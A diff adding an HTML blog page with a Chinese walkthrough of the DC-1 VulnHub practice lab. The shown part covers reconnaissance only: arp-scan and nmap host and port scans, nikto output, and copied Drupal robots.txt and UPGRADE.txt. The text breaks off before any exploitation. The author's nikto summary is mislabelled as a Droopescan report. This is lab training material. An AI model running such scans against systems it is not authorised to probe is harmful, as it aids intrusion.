@@ -1,0 +1,795 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta property="og:site_name" content="My Blog"><meta property="og:type" content="article"><meta property="og:image" content="https://www.princesses.cc//img/home-bg-jeep.jpg"><meta property="twitter:image" content="https://www.princesses.cc//img/home-bg-jeep.jpg"><meta name=title content="dc1靶机提权"><meta property="og:title" content="dc1靶机提权"><meta property="twitter:title" content="dc1靶机提权"><meta name=description content><meta property="og:description" content><meta property="twitter:description" content><meta property="twitter:card" content="summary"><meta name=keyword content><link rel="shortcut icon" href=/img/favicon.ico><title>dc1靶机提权 | 帅蛋的博客 #| Shuai dan Blog</title>
+<link rel=canonical href=/post/2023-12-29-dc1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/dc1/><link rel=stylesheet href=/css/bootstrap.min.css><link rel=stylesheet href=/css/hugo-theme-cleanwhite.min.css><link rel=stylesheet href=/css/zanshang.css><link href=https://cdn.jsdelivr.net/gh/FortAwesome/Font-Awesome@5.15.1/css/all.css rel=stylesheet type=text/css><script src=/js/jquery.min.js></script><script src=/js/bootstrap.min.js></script><script src=/js/hux-blog.min.js></script><script src=/js/lazysizes.min.js></script></head><nav class="navbar navbar-default navbar-custom navbar-fixed-top"><div class=container-fluid><div class="navbar-header page-scroll"><button type=button class=navbar-toggle>
+<span class=sr-only>Toggle navigation</span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+</button>
+<a class=navbar-brand href=/>My Blog</a></div><div id=huxblog_navbar><div class=navbar-collapse><ul class="nav navbar-nav navbar-right"><li><a href=/>All Posts</a></li><li><a href=/categories/life>life</a></li><li><a href=/archive/>档案</a></li><li><a href=/notes/>笔记</a></li><li><a href=/about/>关于</a></li><li><a href=/search><i class="fa fa-search"></i></a></li></ul></div></div></div></nav><script>var $body=document.body,$toggle=document.querySelector(".navbar-toggle"),$navbar=document.querySelector("#huxblog_navbar"),$collapse=document.querySelector(".navbar-collapse");$toggle.addEventListener("click",handleMagic);function handleMagic(){$navbar.className.indexOf("in")>0?($navbar.className=" ",setTimeout(function(){$navbar.className.indexOf("in")<0&&($collapse.style.height="0px")},400)):($collapse.style.height="auto",$navbar.className+=" in")}</script><style type=text/css>header.intro-header{background-image:url(/%c2%a0%20%c2%a0%20%c2%a0%22/img/post-bg-web.jpg%22%20%c2%a0)}</style><header class=intro-header><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><div class=tags></div><h1>dc1靶机提权</h1><h2 class=subheading>难度 : 中等</h2><span class=meta>Posted by
+帅蛋
+on
+Monday, December 25, 2023</span></div></div></div></div></header><article><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2
+col-md-10 col-md-offset-1
+post-container"><h2 id=一外网信息收集>一、外网信息收集</h2><h3 id=1靶机概况>1.靶机概况</h3><h4 id=下载地址>下载地址</h4><pre tabindex=0><code>https://www.vulnhub.com/entry/dc-1,292/
+	//下载地址
+</code></pre><h4 id=靶机描述>靶机描述</h4><pre tabindex=0><code>DESCRIPTION
+	描述
+DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.
+	DC-1是一个专门构建的易受攻击实验室，旨在让人在渗透测试领域获得经验。
+
+It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.
+	它被设计为初学者的挑战，但它的难易程度取决于你的技能和知识，以及你学习的能力。
+
+To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.
+	要成功完成这个挑战，你需要具备Linux技能，熟悉Linux命令行，并具有基本渗透测试工具的经验，比如在Kali Linux或Parrot Security OS上可以找到的工具
+
+There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.
+	有多种方法可以获取root权限，然而，我已经包含了一些包含初学者提示的标志。
+
+There are five flags in total, but the ultimate goal is to find and read the flag in root&#39;s home directory. You don&#39;t even need to be root to do this, however, you will require root privileges.
+	总共有五个标志，但最终目标是找到并读取root用户的主目录中的标志。你甚至不需要成为root用户来完成这个任务，但是你将需要root权限
+
+Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.
+	根据你的技能水平，你可能能够跳过找到大部分标志直接进入获取root权限的步骤
+	
+Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.
+	初学者可能会遇到以前从未遇到过的挑战，但只需进行Google搜索即可获取完成这个挑战所需的信息
+---
+
+TECHNICAL INFORMATION
+	技术信息
+DC-1 is a VirtualBox VM built on Debian 32 bit, so there should be no issues running it on most PCs.
+	DC-1是一个在Debian 32位上构建的VirtualBox虚拟机，因此在大多数个人电脑上运行时应该没有问题。
+
+While I haven&#39;t tested it within a VMware environment, it should also work.
+	虽然我没有在VMware环境中测试过，但它也应该可以工作。
+
+It is currently configured for Bridged Networking, however, this can be changed to suit your requirements. Networking is configured for DHCP.
+	它当前配置为桥接网络，但这可以根据您的要求进行更改。网络配置为DHCP。
+
+Installation is simple - download it, unzip it, and then import it into VirtualBox and away you go.
+	安装很简单-下载它，解压它，然后将其导入VirtualBox，就可以开始使用了。
+---
+
+IMPORTANT
+	重要提示
+
+While there should be no problems using this VM, by downloading it, you accept full responsibility for any unintentional damage that this VM may cause.
+	虽然使用这个虚拟机应该没有问题，但通过下载它，你接受对于这个虚拟机可能造成的任何无意中的损害负有全部责任。
+
+In saying that, there shouldn&#39;t be any problems, but I feel the need to throw this out there just in case.
+话虽如此，不应该出现任何问题，但我觉得有必要提一下。
+
+CONTACT
+	联系方式
+This is the first vulnerable lab challenge that I&#39;ve created, so feel free to let me know what you think of it.
+	这是我创建的第一个易受攻击实验室挑战，欢迎告诉我你对它的看法。
+
+I can be contacted via Twitter - @DCAU7
+	你可以通过Twitter联系我- @DCAU7
+</code></pre><h3 id=2靶机信息>2.靶机信息</h3><h4 id=靶机界面>靶机界面</h4><p><img src=/DC_1.assets/20240127153908.png alt=image.png|425></p><h4 id=网卡信息>网卡信息</h4><pre tabindex=0><code>网卡信息      说明 
+网卡模式      NAT 
+MAC 地址     00:0C:29:69:5D:E0
+</code></pre><p><img src=/DC_1.assets/20240127153947.png alt=image.png|275></p><h2 id=二主动信息收集>二、主动信息收集</h2><h3 id=1主机发现>1.主机发现</h3><pre tabindex=0><code>┌──(kali💋kali)-[~]
+└─$ sudo arp-scan 10.4.7.0/24   //这个命令将执行ARP扫描，显示给定IP范围内的活动主机
+[sudo] password for kali: 
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:0b:87:df, IPv4: 10.4.7.133
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+10.4.7.1        00:50:56:c0:00:08       VMware, Inc.
+10.4.7.2        00:50:56:f1:ad:2a       VMware, Inc.
+10.4.7.135      00:0c:29:69:5d:e0       VMware, Inc.
+10.4.7.254      00:50:56:e2:b5:2a       VMware, Inc.
+</code></pre><p><img src=/DC_1.assets/20240127160204.png alt=image.png|375></p><pre tabindex=0><code>sudo nmap -sP 10.4.7.0/24 -oN nmap.sp
+
+这个命令使用Nmap工具，具体选项如下：
+- `-sP`：该选项指示Nmap执行ping扫描（也称为主机发现扫描），以确定哪些主机处于在线状态，而不实际扫描端口。
+- `10.4.7.0/24`：这是你要扫描的IP范围。它指定了10.4.7.0网络中所有IP地址，子网掩码为255.255.255.0，涵盖了从10.4.7.1到10.4.7.254的范围。
+- `-oN nmap.sp`：此选项将扫描结果以正常格式保存到名为&#34;nmap.sp&#34;的文件中。`-oN`标志用于将输出保存到文件中，可以根据需要指定格式。
+</code></pre><p><strong>根据 Nmap 的扫描结果 ,可以确定目标靶机 IP 地址为 10.4.7.135 (看MAC地址)</strong></p><h3 id=2端口扫描>2.端口扫描</h3><h4 id=命令过程>命令过程</h4><pre tabindex=0><code>sudo nmap -A -p- -sC -T4 10.4.7.135 -oN nmap.A
+
+- `-A`：进行操作系统检测、服务版本检测、脚本扫描以及traceroute等，是一个强大的全面扫描选项。
+- `-p-`：扫描所有65535个端口。这可能会导致扫描时间较长，但确保了对目标的全面检查。
+- `-sC`：运行默认的脚本扫描。Nmap脚本可以提供有关目标系统的进一步信息和漏洞检测。
+- `-T4`：设置扫描速度。T4表示使用“Aggressive”速度，即相对较快的速度，但不会引起太多网络干扰。
+- `10.4.7.135`：目标IP地址。
+- `-oN nmap.A`：将结果保存到名为&#34;nmap.A&#34;的文件中。
+</code></pre><pre tabindex=0><code>┌──(kali💋kali)-[~]
+└─$ nmap -A -p- -sC -T4 10.4.7.135 -oN nmap.A                               148 ⨯ 1 ⚙
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-27 19:58 CST
+Nmap scan report for localhost (10.4.7.135)
+Host is up (0.00073s latency).
+Not shown: 65531 closed tcp ports (conn-refused)
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 c4d659e6774c227a961660678b42488f (DSA)
+|   2048 1182fe534edc5b327f446482757dd0a0 (RSA)
+|_  256 3daa985c87afea84b823688db9055fd8 (ECDSA)
+80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-generator: Drupal 7 (http://drupal.org)
+|_http-title: Welcome to Drupal Site | Drupal Site
+|_http-server-header: Apache/2.2.22 (Debian)
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          34669/tcp   status
+|   100024  1          38319/udp6  status
+|   100024  1          39591/tcp6  status
+|_  100024  1          46420/udp   status
+34669/tcp open  status  1 (RPC #100024)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.97 seconds
+</code></pre><h4 id=端口详情>端口详情</h4><pre tabindex=0><code>PORT   STATE  SERVICE  VERSION 
+22/tcp open    ssh    OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0) 
+80/tcp open    http   Apache httpd 2.2.22 ((Debian)) 
+111/tcp open rpcbind 2-4 (RPC #100000) 56661/tcp open status 1(RPC#100024)
+</code></pre><h3 id=3网站信息>3.网站信息</h3><h4 id=网站首页>网站首页</h4><p><img src=/DC_1.assets/20240127162541.png alt=image.png|450></p><h4 id=技术架构>技术架构</h4><p><img src=/DC_1.assets/20240127162929.png alt=image.png|475></p><pre tabindex=0><code>组件    版本 2.3.2 技术架构 
+Server  Apache/2.2.22 (Debian) 
+X-Powered-By PHP/5.4.45-0+deb7u14
+DB     --
+</code></pre><h4 id=web-应用指纹>Web 应用指纹</h4><p><img src=/DC_1.assets/20240127164907.png alt=image.png|475></p><h4 id=nikto报告>nikto报告</h4><pre tabindex=0><code>┌──(kali💋kali)-[~]
+└─$ nikto -h 10.4.7.135 -o nikto.txt                                              1 ⚙
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.4.7.135
++ Target Hostname:    10.4.7.135
++ Target Port:        80
++ Start Time:         2024-01-27 20:57:08 (GMT8)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.22 (Debian)
++ /: Retrieved x-powered-by header: PHP/5.4.45-0+deb7u14.
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: Drupal 7 was identified via the x-generator header. See: https://www.drupal.org/project/remove_http_headers
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /robots.txt: Server may leak inodes via ETags, header found with file /robots.txt, inode: 152289, size: 1561, mtime: Thu Nov 21 04:45:59 2013. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ /robots.txt: Entry &#39;/INSTALL.mysql.txt&#39; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry &#39;/filter/tips/&#39; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry &#39;/user/password/&#39; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry &#39;/?q=user/password/&#39; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry &#39;/user/register/&#39; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry &#39;/UPGRADE.txt&#39; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry &#39;/?q=user/register/&#39; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry &#39;/MAINTAINERS.txt&#39; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry &#39;/?q=filter/tips/&#39; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry &#39;/install.php&#39; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry &#39;/INSTALL.pgsql.txt&#39; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry &#39;/?q=user/login/&#39; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry &#39;/xmlrpc.php&#39; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry &#39;/INSTALL.sqlite.txt&#39; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry &#39;/user/login/&#39; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry &#39;/LICENSE.txt&#39; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: contains 36 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
++ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ /misc/favicon.ico: identifies this app/server as: Drupal 7.x. See: https://en.wikipedia.org/wiki/Favicon
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
++ /web.config: ASP config file is accessible.
++ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
++ /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
++ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
++ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
++ /user/: This might be interesting.
++ /README: Uncommon header &#39;tcn&#39; found, with contents: choice.
++ /README: README file found.
++ /UPGRADE.txt: Default file found.
++ /install.php: Drupal install.php file found. See: https://drupal.stackexchange.com/questions/269076/how-do-i-restrict-access-to-the-install-php-filehttps://drupal.stackexchange.com/questions/269076/how-do-i-restrict-access-to-the-install-php-file
++ /install.php: install.php file found.
++ /LICENSE.txt: License file found may identify site software.
++ /xmlrpc.php: xmlrpc.php was found.
++ /INSTALL.mysql.txt: Drupal installation file found. See: https://drupal.stackexchange.com/questions/269076/how-do-i-restrict-access-to-the-install-php-file
++ /INSTALL.pgsql.txt: Drupal installation file found. See: https://drupal.stackexchange.com/questions/269076/how-do-i-restrict-access-to-the-install-php-file
++ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
++ 9753 requests: 0 error(s) and 42 item(s) reported on remote host
++ End Time:           2024-01-27 21:12:14 (GMT8) (906 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+
+这份Droopescan扫描报告提供了对目标网站的一些关键信息和潜在问题的分析。以下是翻译的主要发现：
+
+1. **Web服务器信息：**
+    
+    - 服务器：Apache/2.2.22 (Debian)
+    - PHP版本：5.4.45-0+deb7u14
+    - Drupal版本：Drupal 7
+2. **安全性问题和建议：**
+    
+    - 缺少 X-Frame-Options 头，可能受到点击劫持攻击的风险。
+    - 缺少 X-Content-Type-Options 头，可能导致用户代理以不同方式呈现站点内容。
+    - Apache/2.2.22 版本已过时，建议升级至 Apache/2.4.54。
+    - robots.txt 文件可能泄露inode信息，存在CVE-2003-1418漏洞。
+    - robots.txt 文件包含一些返回非禁止或重定向HTTP代码（200）的条目，可能导致信息泄露或敏感路径暴露。
+3. **其他信息：**
+    
+    - Favicon文件显示网站是Drupal 7.x。
+    - Web服务器返回带有不同HTTP方法的有效响应，可能导致误报。
+    - DEBUG HTTP谓词可能显示服务器调试信息。
+    - 可以访问ASP配置文件（web.config）。
+    - 存在一些特定QUERY字符串的PHP文件可能泄露潜在敏感信息。
+4. **发现的文件和目录：**
+    
+    - /user/: 可能包含有趣的信息。
+    - /README: 发现README文件。
+    - /UPGRADE.txt: 默认文件存在。
+    - /install.php: 存在Drupal的install.php文件。
+    - /LICENSE.txt: 存在许可文件。
+    - /xmlrpc.php: 发现xmlrpc.php文件。
+    - /INSTALL.mysql.txt: 存在Drupal的安装文件。
+    - /INSTALL.pgsql.txt: 存在Drupal的安装文件。
+    - /icons/README: 发现Apache默认文件。
+
+这个报告提供了关于Drupal网站的一些基本信息，以及可能存在的安全问题。建议对发现的漏洞和不安全配置进行修复，以提高网站的安全性。
+</code></pre><h4 id=robotstxt>robots.txt</h4><p><code>http://10.4.7.135/robots.txt</code></p><pre tabindex=0><code>#
+# robots.txt
+#
+# This file is to prevent the crawling and indexing of certain parts
+# of your site by web crawlers and spiders run by sites like Yahoo!
+# and Google. By telling these &#34;robots&#34; where not to go on your site,
+# you save bandwidth and server resources.
+#
+# This file will be ignored unless it is at the root of your host:
+# Used:    http://example.com/robots.txt
+# Ignored: http://example.com/site/robots.txt
+#
+# For more information about the robots.txt standard, see:
+# http://www.robotstxt.org/wc/robots.html
+#
+# For syntax checking, see:
+# http://www.sxw.org.uk/computing/robots/check.html
+
+User-agent: *
+Crawl-delay: 10
+# Directories
+Disallow: /includes/
+Disallow: /misc/
+Disallow: /modules/
+Disallow: /profiles/
+Disallow: /scripts/
+Disallow: /themes/
+# Files
+Disallow: /CHANGELOG.txt
+Disallow: /cron.php
+Disallow: /INSTALL.mysql.txt
+Disallow: /INSTALL.pgsql.txt
+Disallow: /INSTALL.sqlite.txt
+Disallow: /install.php
+Disallow: /INSTALL.txt
+Disallow: /LICENSE.txt
+Disallow: /MAINTAINERS.txt
+Disallow: /update.php
+Disallow: /UPGRADE.txt
+Disallow: /xmlrpc.php
+# Paths (clean URLs)
+Disallow: /admin/
+Disallow: /comment/reply/
+Disallow: /filter/tips/
+Disallow: /node/add/
+Disallow: /search/
+Disallow: /user/register/
+Disallow: /user/password/
+Disallow: /user/login/
+Disallow: /user/logout/
+# Paths (no clean URLs)
+Disallow: /?q=admin/
+Disallow: /?q=comment/reply/
+Disallow: /?q=filter/tips/
+Disallow: /?q=node/add/
+Disallow: /?q=search/
+Disallow: /?q=user/password/
+Disallow: /?q=user/register/
+Disallow: /?q=user/login/
+Disallow: /?q=user/logout/
+
+# robots.txt
+#
+# 此文件用于防止Web爬虫和由Yahoo!和Google等站点运行的蜘蛛爬取和索引站点的某些部分。
+# 通过告诉这些“机器人”不要访问您站点上的特定区域，您可以节省带宽和服务器资源。
+#
+# 除非它位于您主机的根目录下，否则将忽略此文件：
+# 使用：    http://example.com/robots.txt
+# 忽略：    http://example.com/site/robots.txt
+#
+# 有关robots.txt标准的更多信息，请参见：
+# http://www.robotstxt.org/wc/robots.html
+#
+# 语法检查，请参见：
+# http://www.sxw.org.uk/computing/robots/check.html
+
+User-agent: *
+Crawl-delay: 10  # 设置每个请求之间的爬取延迟为10秒
+# 目录
+Disallow: /includes/
+Disallow: /misc/
+Disallow: /modules/
+Disallow: /profiles/
+Disallow: /scripts/
+Disallow: /themes/
+# 文件
+Disallow: /CHANGELOG.txt
+Disallow: /cron.php
+Disallow: /INSTALL.mysql.txt
+Disallow: /INSTALL.pgsql.txt
+Disallow: /INSTALL.sqlite.txt
+Disallow: /install.php
+Disallow: /INSTALL.txt
+Disallow: /LICENSE.txt
+Disallow: /MAINTAINERS.txt
+Disallow: /update.php
+Disallow: /UPGRADE.txt
+Disallow: /xmlrpc.php
+# 路径（使用“干净”URL）
+Disallow: /admin/
+Disallow: /comment/reply/
+Disallow: /filter/tips/
+Disallow: /node/add/
+Disallow: /search/
+Disallow: /user/register/
+Disallow: /user/password/
+Disallow: /user/login/
+Disallow: /user/logout/
+# 路径（无“干净”URL）
+Disallow: /?q=admin/
+Disallow: /?q=comment/reply/
+Disallow: /?q=filter/tips/
+Disallow: /?q=node/add/
+Disallow: /?q=search/
+Disallow: /?q=user/password/
+Disallow: /?q=user/register/
+Disallow: /?q=user/login/
+Disallow: /?q=user/logout/
+</code></pre><h4 id=upgradetxt>UPGRADE.txt</h4><p><code>http://10.4.7.135/UPGRADE.txt</code></p><pre tabindex=0><code>INTRODUCTION
+------------
+This document describes how to:
+
+  * Update your Drupal site from one minor 7.x version to another minor 7.x
+    version; for example, from 7.8 to 7.9, or from 7.6 to 7.10.
+
+  * Upgrade your Drupal site&#39;s major version from 6.x to 7.x.
+
+First steps and definitions:
+
+  * If you are upgrading to Drupal version x.y, then x is known as the major
+    version number, and y is known as the minor version number. The download
+    file will be named drupal-x.y.tar.gz (or drupal-x.y.zip).
+
+  * All directories mentioned in this document are relative to the directory of
+    your Drupal installation.
+
+  * Make a full backup of all files, directories, and your database(s) before
+    starting, and save it outside your Drupal installation directory.
+    Instructions may be found at http://drupal.org/upgrade/backing-up-the-db
+
+  * It is wise to try an update or upgrade on a test copy of your site before
+    applying it to your live site. Even minor updates can cause your site&#39;s
+    behavior to change.
+
+  * Each new release of Drupal has release notes, which explain the changes made
+    since the previous version and any special instructions needed to update or
+    upgrade to the new version. You can find a link to the release notes for the
+    version you are upgrading or updating to on the Drupal project page
+    (http://drupal.org/project/drupal).
+
+UPGRADE PROBLEMS
+----------------
+If you encounter errors during this process,
+
+  * Note any error messages you see.
+
+  * Restore your site to its previous state, using the file and database backups
+    you created before you started the upgrade process. Do not attempt to do
+    further upgrades on a site that had update problems.
+
+  * Consult one of the support options listed on http://drupal.org/support
+
+More in-depth information on upgrading can be found at http://drupal.org/upgrade
+
+MINOR VERSION UPDATES
+---------------------
+To update from one minor 7.x version of Drupal to any later 7.x version, after
+following the instructions in the INTRODUCTION section at the top of this file:
+
+1. Log in as a user with the permission &#34;Administer software updates&#34;.
+
+2. Go to Administration &gt; Configuration &gt; Development &gt; Maintenance mode.
+   Enable the &#34;Put site into maintenance mode&#34; checkbox and save the
+   configuration.
+
+3. Remove all old core files and directories, except for the &#39;sites&#39; directory
+   and any custom files you added elsewhere.
+
+   If you made modifications to files like .htaccess or robots.txt, you will
+   need to re-apply them from your backup, after the new files are in place.
+
+   Sometimes an update includes changes to default.settings.php (this will be
+   noted in the release notes). If that&#39;s the case, follow these steps:
+
+   - Make a backup copy of your settings.php file, with a different file name.
+
+   - Make a copy of the new default.settings.php file, and name the copy
+     settings.php (overwriting your previous settings.php file).
+
+   - Copy the custom and site-specific entries from the backup you made into the
+     new settings.php file. You will definitely need the lines giving the
+     database information, and you will also want to copy in any other
+     customizations you have added.
+
+4. Download the latest Drupal 7.x release from http://drupal.org to a
+   directory outside of your web root. Extract the archive and copy the files
+   into your Drupal directory.
+
+   On a typical Unix/Linux command line, use the following commands to download
+   and extract:
+
+     wget http://drupal.org/files/projects/drupal-x.y.tar.gz
+     tar -zxvf drupal-x.y.tar.gz
+
+   This creates a new directory drupal-x.y/ containing all Drupal files and
+   directories. Copy the files into your Drupal installation directory:
+
+     cp -R drupal-x.y/* drupal-x.y/.htaccess /path/to/your/installation
+
+   If you do not have command line access to your server, download the archive
+   from http://drupal.org using your web browser, extract it, and then use an
+   FTP client to upload the files to your web root.
+
+5. Re-apply any modifications to files such as .htaccess or robots.txt.
+
+6. Run update.php by visiting http://www.example.com/update.php (replace
+   www.example.com with your domain name). This will update the core database
+   tables.
+
+   If you are unable to access update.php do the following:
+
+   - Open settings.php with a text editor.
+
+   - Find the line that says:
+     $update_free_access = FALSE;
+
+   - Change it into:
+     $update_free_access = TRUE;
+
+   - Once the upgrade is done, $update_free_access must be reverted to FALSE.
+
+7. Go to Administration &gt; Reports &gt; Status report. Verify that everything is
+   working as expected.
+
+8. Ensure that $update_free_access is FALSE in settings.php.
+
+9. Go to Administration &gt; Configuration &gt; Development &gt; Maintenance mode.
+   Disable the &#34;Put site into maintenance mode&#34; checkbox and save the
+   configuration.
+
+MAJOR VERSION UPGRADE
+---------------------
+To upgrade from a previous major version of Drupal to Drupal 7.x, after
+following the instructions in the INTRODUCTION section at the top of this file:
+
+1. Check on the Drupal 7 status of your contributed and custom modules and
+   themes. See http://drupal.org/node/948216 for information on upgrading
+   contributed modules and themes. See http://drupal.org/node/895314 for a list
+   of modules that have been moved into core for Drupal 7, and instructions on
+   how to update them. See http://drupal.org/update/modules for information on
+   how to update your custom modules, and http://drupal.org/update/theme for
+   custom themes.
+
+   You may decide at this point that you cannot upgrade your site, because
+   needed modules or themes are not ready for Drupal 7.
+
+2. Update to the latest available version of Drupal 6.x (if your current version
+   is Drupal 5.x, you have to upgrade to 6.x first). If you need to update,
+   download Drupal 6.x and follow the instructions in its UPGRADE.txt. This
+   document only applies for upgrades from 6.x to 7.x.
+
+3. In addition to updating to the latest available version of Drupal 6.x core,
+   you must also upgrade all of your contributed modules for Drupal to their
+   latest Drupal 6.x versions.
+
+4. Log in as user ID 1 (the site maintenance user).
+
+5. Go to Administer &gt; Site configuration &gt; Site maintenance. Select
+   &#34;Off-line&#34; and save the configuration.
+
+6. Go to Administer &gt; Site building &gt; Themes. Enable &#34;Garland&#34; and select it as
+   the default theme.
+
+7. Go to Administer &gt; Site building &gt; Modules. Disable all modules that are not
+   listed under &#34;Core - required&#34; or &#34;Core - optional&#34;. It is possible that some
+   modules cannot be disabled, because others depend on them. Repeat this step
+   until all non-core modules are disabled.
+
+   If you know that you will not re-enable some modules for Drupal 7.x and you
+   no longer need their data, then you can uninstall them under the Uninstall
+   tab after disabling them.
+
+8. On the command line or in your FTP client, remove the file
+
+     sites/default/default.settings.php
+
+9. Remove all old core files and directories, except for the &#39;sites&#39; directory
+   and any custom files you added elsewhere.
+
+   If you made modifications to files like .htaccess or robots.txt, you will
+   need to re-apply them from your backup, after the new files are in place.
+
+10. If you uninstalled any modules, remove them from the sites/all/modules and
+   other sites/*/modules directories. Leave other modules in place, even though
+   they are incompatible with Drupal 7.x.
+
+11. Download the latest Drupal 7.x release from http://drupal.org to a
+   directory outside of your web root. Extract the archive and copy the files
+   into your Drupal directory.
+
+   On a typical Unix/Linux command line, use the following commands to download
+   and extract:
+
+     wget http://drupal.org/files/projects/drupal-x.y.tar.gz
+     tar -zxvf drupal-x.y.tar.gz
+
+   This creates a new directory drupal-x.y/ containing all Drupal files and
+   directories. Copy the files into your Drupal installation directory:
+
+     cp -R drupal-x.y/* drupal-x.y/.htaccess /path/to/your/installation
+
+   If you do not have command line access to your server, download the archive
+   from http://drupal.org using your web browser, extract it, and then use an
+   FTP client to upload the files to your web root.
+
+12. Re-apply any modifications to files such as .htaccess or robots.txt.
+
+13. Make your settings.php file writeable, so that the update process can
+   convert it to the format of Drupal 7.x. settings.php is usually located in
+
+     sites/default/settings.php
+
+14. Run update.php by visiting http://www.example.com/update.php (replace
+   www.example.com with your domain name). This will update the core database
+   tables.
+
+   If you are unable to access update.php do the following:
+
+   - Open settings.php with a text editor.
+
+   - Find the line that says:
+     $update_free_access = FALSE;
+
+   - Change it into:
+     $update_free_access = TRUE;
+
+   - Once the upgrade is done, $update_free_access must be reverted to FALSE.
+
+15. Backup your database after the core upgrade has run.
+
+16. Replace and update your non-core modules and themes, following the
+   procedures at http://drupal.org/node/948216
+
+17. Go to Administration &gt; Reports &gt; Status report. Verify that everything is
+   working as expected.
+
+18. Ensure that $update_free_access is FALSE in settings.php.
+
+19. Go to Administration &gt; Configuration &gt; Development &gt; Maintenance mode.
